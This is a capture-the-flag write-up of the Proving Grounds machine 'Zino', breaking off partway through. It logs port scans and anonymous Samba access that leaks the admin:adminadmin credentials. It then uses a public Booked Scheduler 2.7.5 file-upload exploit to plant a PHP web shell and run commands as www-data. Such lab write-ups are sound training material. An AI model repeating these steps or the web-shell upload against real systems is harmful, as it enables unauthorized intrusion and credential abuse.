# Zino

# Enumeration

## nmap

```
┌──(kali㉿kali)-[/tmp]
└─$ rustscan -a 192.168.162.64
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.162.64:21
Open 192.168.162.64:22
Open 192.168.162.64:139
Open 192.168.162.64:445
Open 192.168.162.64:8003
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-29 08:35 EST
Initiating Ping Scan at 08:35
Scanning 192.168.162.64 [2 ports]
Completed Ping Scan at 08:35, 3.01s elapsed (1 total hosts)
Nmap scan report for 192.168.162.64 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.54 seconds

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$
```

```
# Nmap 7.91 scan initiated Sat Jan 29 08:18:48 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Zino/results/192.168.162.64/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Zino/results/192.168.162.64/scans/xml/_full_tcp_nmap.xml" 192.168.162.64
Nmap scan report for 192.168.162.64
Host is up, received user-set (0.18s latency).
Scanned at 2022-01-29 08:18:52 EST for 410s
Not shown: 65529 filtered ports
Reason: 65529 no-responses
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b2:66:75:50:1b:18:f5:e9:9f:db:2c:d4:e3:95:7a:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC44YysvRUv+02vB7LK+DbEvDnTUU2Zzaj42pbyX7gL4I5DhhWWZmK4Sr/MulEE2XPnKhXCCwTVuA12C/VuFhVdnq7WjDwfV+4a1DEuDG8P7wQAux0waAsly34mGtd7HQhQIv9h7nQWcTx8hoOrF6D71eHiZmLJ6fk01VlFN75XKJGn/T/ClJHz9UJ33zwkhqXskMO9At21LfOBE+I3IQCHuFFO6DcQWw/SsZaXQxHNzLqnI/9j1aQuvyuh6KMdT6p10D577maBz+T+Hyq/qeOgbGU0YGAoXXMU36FibkoQ+WwDRYbEHYKJccUXhzFWp980PYCIDtZNaWuo/AbgryLB
|   256 91:2d:26:f1:ba:af:d1:8b:69:8f:81:4a:32:af:9c:77 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOmcORNC6GjDnH1cqJrCeytZJjGrpJyY+CgseFsH27PJmSbmVYEz0ls0w/oXR0xrG/IfvxxyH9RRX2BIsBTx2cY=
|   256 ec:6f:df:8b:ce:19:13:8a:52:57:3e:72:a3:14:6f:40 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9wfKL6wusRXGDMv5Tcf2OxMAIkhvOofRPsrSQ+aMbK
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql?      syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, Kerberos, LANDesk-RC, NULL, NessusTPv10, SSLv23SessionReq, Socks5, TLSSessionReq, TerminalServerCookie, Verifier, VerifierAdvanced, WMSRequest, WWWOFFLEctrlstat, ibm-db2-das, oracle-tns: 
|_    Host '192.168.49.162' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '192.168.49.162' is not allowed to connect to this MariaDB server
8003/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Index of /
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=9%D=1/29%Time=61F53FFE%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericLi
SF:nes,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Terminal
SF:ServerCookie,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x20is\x2
SF:0not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r
SF:(TLSSessionReq,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x20is\
SF:x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")
SF:%r(SSLv23SessionReq,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x
SF:20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20ser
SF:ver")%r(Kerberos,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x20i
SF:s\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server
SF:")%r(LANDesk-RC,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:)%r(NessusTPv10,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:)%r(WMSRequest,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x20is\
SF:x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")
SF:%r(oracle-tns,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x20is\x
SF:20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%
SF:r(WWWOFFLEctrlstat,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x2
SF:0is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serv
SF:er")%r(Verifier,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:)%r(VerifierAdvanced,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\
SF:x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20se
SF:rver")%r(Socks5,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:)%r(ibm-db2-das,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.162'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:);
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:5
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 5.0 - 5.3 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/29%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61F54056%P=x86_64-pc-linux-gnu)
SEQ(SP=F8%GCD=1%ISR=110%TI=Z%II=I%TS=A)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 20.467 days (since Sat Jan  8 21:13:37 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=244 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Hosts: ZINO, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h38m42s, deviation: 2h53m14s, median: -1m18s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 41933/tcp): CLEAN (Timeout)
|   Check 2 (port 43229/tcp): CLEAN (Timeout)
|   Check 3 (port 27637/udp): CLEAN (Timeout)
|   Check 4 (port 29155/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: zino
|   NetBIOS computer name: ZINO\x00
|   Domain name: \x00
|   FQDN: zino
|_  System time: 2022-01-29T08:23:43-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-29T13:23:42
|_  start_date: N/A

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   179.46 ms 192.168.49.1
2   179.46 ms 192.168.162.64

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 29 08:25:42 2022 -- 1 IP address (1 host up) scanned in 416.64 seconds
```

## 21 - FTP

```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.162.64                                                                                                                                            130 ⨯
Connected to 192.168.162.64.
220 (vsFTPd 3.0.3)
Name (192.168.162.64:kali): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$
```

## 139,445 - Samba

```
┌──(kali㉿kali)-[/tmp]
└─$ smbmap -H 192.168.162.64 -P 445 -R 
[+] IP: 192.168.162.64:445      Name: 192.168.162.64                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        zino                                                    READ ONLY       Logs
        .\zino\*
        dr--r--r--                0 Thu Jul  9 15:11:49 2020    .
        dr--r--r--                0 Tue Apr 28 09:38:53 2020    ..
        fr--r--r--                0 Tue Apr 28 11:35:28 2020    .bash_history
        fr--r--r--              265 Tue Apr 28 10:07:32 2020    error.log
        fr--r--r--              220 Tue Apr 28 09:38:53 2020    .bash_logout
        fr--r--r--               33 Sat Jan 29 08:17:20 2022    local.txt
        fr--r--r--             3526 Tue Apr 28 09:38:53 2020    .bashrc
        dr--r--r--                0 Tue Apr 28 10:17:02 2020    .gnupg
        fr--r--r--              807 Tue Apr 28 09:38:53 2020    .profile
        fr--r--r--              424 Tue Apr 28 10:08:14 2020    misc.log
        fr--r--r--              368 Tue Apr 28 10:07:54 2020    auth.log
        fr--r--r--             5464 Tue Apr 28 10:07:09 2020    access.log
        dr--r--r--                0 Tue Apr 28 10:12:55 2020    ftp
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

┌──(kali㉿kali)-[/tmp]
└─$ smbclient //192.168.162.64/zino -N                                                                                                                              1 ⨯
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul  9 15:11:49 2020
  ..                                  D        0  Tue Apr 28 09:38:53 2020
  .bash_history                       H        0  Tue Apr 28 11:35:28 2020
  error.log                           N      265  Tue Apr 28 10:07:32 2020
  .bash_logout                        H      220  Tue Apr 28 09:38:53 2020
  local.txt                           N       33  Sat Jan 29 08:17:20 2022
  .bashrc                             H     3526  Tue Apr 28 09:38:53 2020
  .gnupg                             DH        0  Tue Apr 28 10:17:02 2020
  .profile                            H      807  Tue Apr 28 09:38:53 2020
  misc.log                            N      424  Tue Apr 28 10:08:15 2020
  auth.log                            N      368  Tue Apr 28 10:07:54 2020
  access.log                          N     5464  Tue Apr 28 10:07:09 2020
  ftp                                 D        0  Tue Apr 28 10:12:56 2020

                7158264 blocks of size 1024. 4702876 blocks available
smb: \> get local.txt
getting file \local.txt of size 33 as local.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> get misc.log
getting file \misc.log of size 424 as misc.log (0.6 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> get auth.log
getting file \auth.log of size 368 as auth.log (0.5 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> get access.log
getting file \access.log of size 5464 as access.log (7.5 KiloBytes/sec) (average 2.2 KiloBytes/sec)
smb: \> cd ftp
smb: \ftp\> ls
  .                                   D        0  Tue Apr 28 10:12:56 2020
  ..                                  D        0  Thu Jul  9 15:11:49 2020

                7158264 blocks of size 1024. 4702688 blocks available
smb: \ftp\> exit
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat local.txt 
815569a957362a5b978b2b0853cbe43d
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat misc.log 
Apr 28 08:39:01 zino systemd[1]: Starting Clean php session files...
Apr 28 08:39:01 zino CRON[2791]: (CRON) info (No MTA installed, discarding output)
Apr 28 08:39:01 zino systemd[1]: phpsessionclean.service: Succeeded.
Apr 28 08:39:01 zino systemd[1]: Started Clean php session files.
Apr 28 08:39:01 zino systemd[1]: Set application username "admin"
Apr 28 08:39:01 zino systemd[1]: Set application password "adminadmin"
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat auth.log       
Apr 28 08:16:54 zino groupadd[1044]: new group: name=peter, GID=1001
Apr 28 08:16:54 zino useradd[1048]: new user: name=peter, UID=1001, GID=1001, home=/home/peter, shell=/bin/bash
Apr 28 08:17:01 zino passwd[1056]: pam_unix(passwd:chauthtok): password changed for peter
Apr 28 08:17:01 zino CRON[1058]: pam_unix(cron:session): session opened for user root by (uid=0)
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat access.log 
192.168.234.30 - - [28/Apr/2020:08:26:05 -0400] "GET / HTTP/1.1" 200 664 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:06 -0400] "GET /icons/blank.gif HTTP/1.1" 200 431 "http://192.168.234.130:8003/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:06 -0400] "GET /icons/folder.gif HTTP/1.1" 200 508 "http://192.168.234.130:8003/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:06 -0400] "GET /favicon.ico HTTP/1.1" 404 495 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:08 -0400] "GET /booked/ HTTP/1.1" 200 223 "http://192.168.234.130:8003/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:08 -0400] "GET /booked/Web/? HTTP/1.1" 200 3984 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:08 -0400] "GET /booked/Web/scripts/css/jquery-ui-timepicker-addon.css?v=2.7.5 HTTP/1.1" 200 787 "http://192.168.234.130:8003/booked/Web/?" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:08 -0400] "GET /booked/Web/css/null-style.css?v=2.7.5 HTTP/1.1" 200 426 "http://192.168.234.130:8003/booked/Web/?" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:08 -0400] "GET /booked/Web/css/booked.css?v=2.7.5 HTTP/1.1" 200 11164 "http://192.168.234.130:8003/booked/Web/?" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:08 -0400] "GET /booked/Web/scripts/js/jquery-ui-timepicker-addon.js?v=2.7.5 HTTP/1.1" 200 18938 "http://192.168.234.130:8003/booked/Web/?" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:08 -0400] "GET /booked/Web/img/booked.png?2.6 HTTP/1.1" 200 4844 "http://192.168.234.130:8003/booked/Web/?" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:08 -0400] "GET /booked/Web/img/external/btn_google_signin_dark_normal_web.png HTTP/1.1" 200 4268 "http://192.168.234.130:8003/booked/Web/?" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:08 -0400] "GET /booked/Web/img/external/btn_facebook_login.png HTTP/1.1" 200 14457 "http://192.168.234.130:8003/booked/Web/?" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:08 -0400] "GET /booked/Web/img/booked.png?2.7.5 HTTP/1.1" 200 4844 "http://192.168.234.130:8003/booked/Web/?" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:08 -0400] "GET /booked/Web/scripts/phpscheduleit.js?v=2.7.5 HTTP/1.1" 200 1756 "http://192.168.234.130:8003/booked/Web/?" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:08 -0400] "GET /booked/Web/favicon.ico HTTP/1.1" 200 32340 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:16 -0400] "POST /booked/Web/index.php HTTP/1.1" 302 341 "http://192.168.234.130:8003/booked/Web/?" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:16 -0400] "GET /booked/Web/dashboard.php HTTP/1.1" 200 3588 "http://192.168.234.130:8003/booked/Web/?" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:17 -0400] "GET /booked/Web/scripts/js/owl-2.2.1/assets/owl.theme.default.css?v=2.7.5 HTTP/1.1" 200 864 "http://192.168.234.130:8003/booked/Web/dashboard.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:17 -0400] "GET /booked/Web/scripts/js/owl-2.2.1/assets/owl.carousel.min.css?v=2.7.5 HTTP/1.1" 200 1252 "http://192.168.234.130:8003/booked/Web/dashboard.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:17 -0400] "GET /booked/Web/scripts/dashboard.js?v=2.7.5 HTTP/1.1" 200 1416 "http://192.168.234.130:8003/booked/Web/dashboard.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:17 -0400] "GET /booked/Web/scripts/js/owl-2.2.1/owl.carousel.min.js?v=2.7.5 HTTP/1.1" 200 11285 "http://192.168.234.130:8003/booked/Web/dashboard.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:17 -0400] "GET /booked/Web/scripts/resourcePopup.js?v=2.7.5 HTTP/1.1" 200 1618 "http://192.168.234.130:8003/booked/Web/dashboard.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:17 -0400] "GET /booked/Web/scripts/ajax-helpers.js?v=2.7.5 HTTP/1.1" 200 2332 "http://192.168.234.130:8003/booked/Web/dashboard.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:17 -0400] "GET /booked/Web/img/booked.png?2.7.5 HTTP/1.1" 304 181 "http://192.168.234.130:8003/booked/Web/dashboard.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```



## 8003 - Web

![](Pasted%20image%2020220129221502.png)
![](Pasted%20image%2020220129221450.png)

Booked Scheduler 2.7.5

Tried with `admin`:`admin` which doesn't work


# Exploitation

## Credentials leak from Samba

Can log in with `admin`:`adminadmin`

![](Pasted%20image%2020220129222806.png)


## File Upload CVE

https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF

https://www.exploit-db.com/exploits/50594

```
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit booked           
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Booked Scheduler 2.7.5 - Remote Command Execution (Metasploit)                                                                        | php/webapps/46486.rb
Booked Scheduler 2.7.7 - Authenticated Directory Traversal                                                                            | php/webapps/48428.txt
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 50594
[!] Could not find EDB-ID #50594


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ wget https://www.exploit-db.com/download/50594 -O 50594.py
--2022-01-29 09:20:27--  https://www.exploit-db.com/download/50594
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3178 (3.1K) [application/txt]
Saving to: ‘50594.py’

50594.py                                  100%[=====================================================================================>]   3.10K  --.-KB/s    in 0s      

2022-01-29 09:20:28 (106 MB/s) - ‘50594.py’ saved [3178/3178]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python 50594.py                                                                              
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[+] Usage : 50594.py https://target:port username password
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python 50594.py http://192.168.162.64:8003 admin adminadmin
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[+] Logged in successfully.
[+] Uploaded shell successfully
[+] http://192.168.162.64:8003/booked/Web/custom-favicon.php?cmd=
()
$ whoami
Traceback (most recent call last):
  File "50594.py", line 116, in <module>
    shell()
  File "50594.py", line 98, in shell
    cmd = input("$ ")
  File "<string>", line 1, in <module>
NameError: name 'whoami' is not defined
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 50594.py http://192.168.162.64:8003 admin adminadmin                                                                                                    1 ⨯
[+] Logged in successfully.
[+] Uploaded shell successfully
[+] http://192.168.162.64:8003/booked/Web/custom-favicon.php?cmd=

$ whoami
www-data

$ ls /usr/bin | grep python
dh_python2
python
python2
python2.7
python3
python3.7
python3.7m
python3m

$
```

## Some Enumeration

Port testing
```
$ wget 192.168.49.162:443 -O /tmp/t
^CTraceback (most recent call last):
  File "/tmp/50594.py", line 116, in <module>
    shell()
  File "/tmp/50594.py", line 99, in shell
    shell_req = request.get(target+"/booked/Web/custom-favicon.php" + '?cmd='+cmd)
  File "/home/kali/.local/lib/python3.9/site-packages/requests/sessions.py", line 546, in get
    return self.request('GET', url, **kwargs)
  File "/home/kali/.local/lib/python3.9/site-packages/requests/sessions.py", line 533, in request
    resp = self.send(prep, **send_kwargs)
  File "/home/kali/.local/lib/python3.9/site-packages/requests/sessions.py", line 646, in send
    r = adapter.send(request, **kwargs)
  File "/home/kali/.local/lib/python3.9/site-packages/requests/adapters.py", line 439, in send
    resp = conn.urlopen(
  File "/home/kali/.local/lib/python3.9/site-packages/urllib3/connectionpool.py", line 670, in urlopen
    httplib_response = self._make_request(
  File "/home/kali/.local/lib/python3.9/site-packages/urllib3/connectionpool.py", line 426, in _make_request
    six.raise_from(e, None)
  File "<string>", line 3, in raise_from
  File "/home/kali/.local/lib/python3.9/site-packages/urllib3/connectionpool.py", line 421, in _make_request
    httplib_response = conn.getresponse()
  File "/usr/lib/python3.9/http/client.py", line 1347, in getresponse
    response.begin()
  File "/usr/lib/python3.9/http/client.py", line 307, in begin
    version, status, reason = self._read_status()
  File "/usr/lib/python3.9/http/client.py", line 268, in _read_status
    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
  File "/usr/lib/python3.9/socket.py", line 704, in readinto
    return self._sock.recv_into(b)
KeyboardInterrupt

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 50594.py http://192.168.162.64:8003 admin adminadmin                                                                                                  130 ⨯
[+] Logged in successfully.
[+] Uploaded shell successfully
[+] http://192.168.162.64:8003/booked/Web/custom-favicon.php?cmd=

$ wget 192.168.49.162 -O /tmp/t
^CTraceback (most recent call last):
  File "/tmp/50594.py", line 116, in <module>
    shell()
  File "/tmp/50594.py", line 99, in shell
    shell_req = request.get(target+"/booked/Web/custom-favicon.php" + '?cmd='+cmd)
  File "/home/kali/.local/lib/python3.9/site-packages/requests/sessions.py", line 546, in get
    return self.request('GET', url, **kwargs)
  File "/home/kali/.local/lib/python3.9/site-packages/requests/sessions.py", line 533, in request
    resp = self.send(prep, **send_kwargs)
  File "/home/kali/.local/lib/python3.9/site-packages/requests/sessions.py", line 646, in send
    r = adapter.send(request, **kwargs)
  File "/home/kali/.local/lib/python3.9/site-packages/requests/adapters.py", line 439, in send
    resp = conn.urlopen(
  File "/home/kali/.local/lib/python3.9/site-packages/urllib3/connectionpool.py", line 670, in urlopen
    httplib_response = self._make_request(
  File "/home/kali/.local/lib/python3.9/site-packages/urllib3/connectionpool.py", line 426, in _make_request
    six.raise_from(e, None)
  File "<string>", line 3, in raise_from
  File "/home/kali/.local/lib/python3.9/site-packages/urllib3/connectionpool.py", line 421, in _make_request
    httplib_response = conn.getresponse()
  File "/usr/lib/python3.9/http/client.py", line 1347, in getresponse
    response.begin()
  File "/usr/lib/python3.9/http/client.py", line 307, in begin
    version, status, reason = self._read_status()
  File "/usr/lib/python3.9/http/client.py", line 268, in _read_status
    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
  File "/usr/lib/python3.9/socket.py", line 704, in readinto
    return self._sock.recv_into(b)
KeyboardInterrupt

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$
```

```
┌──(kali㉿kali)-[/tmp]
└─$ python3 50594.py http://192.168.162.64:8003 admin adminadmin                                                                                                  130 ⨯
[+] Logged in successfully.
[+] Uploaded shell successfully
[+] http://192.168.162.64:8003/booked/Web/custom-favicon.php?cmd=

$ pwd
/var/www/html/booked/Web

$ ls /home
peter

$ ls /home/peter
access.log
auth.log
error.log
ftp
local.txt
misc.log

$ cat /home/peter/local.txt
815569a957362a5b978b2b0853cbe43d

$ ls -al /home/peter
total 52
drwxr-xr-x 4 peter  peter   4096 Jul  9  2020 .
drwxr-xr-x 3 root   root    4096 Apr 28  2020 ..
